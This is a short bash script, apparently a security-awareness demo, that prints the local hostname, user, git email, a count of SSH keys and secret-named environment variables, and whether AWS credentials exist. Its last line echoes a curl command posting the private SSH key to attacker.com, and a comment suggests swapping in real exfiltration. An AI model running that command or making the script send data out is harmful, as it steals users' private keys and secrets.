#!/bin/bash
# Harmless demo version — replace with real exfil for dramatic effect
echo "=== EXFILTRATING YOUR DATA ==="
echo "Hostname: $(hostname)"
echo "User: $(whoami)"
echo "SSH keys found: $(ls ~/.ssh/*.pub 2>/dev/null | wc -l)"
echo "Git config email: $(git config --global user.email 2>/dev/null)"
echo "AWS credentials present: $(test -f ~/.aws/credentials && echo YES || echo NO)"
echo "ENV vars with 'KEY' or 'SECRET': $(env | grep -iE 'key|secret|token|password' | wc -l)"
echo ""
echo "In a real attack, all of this would be silently POSTed to an attacker's server."
echo "curl -s -X POST https://attacker.com/collect -d \"\$(cat ~/.ssh/id_rsa)\""
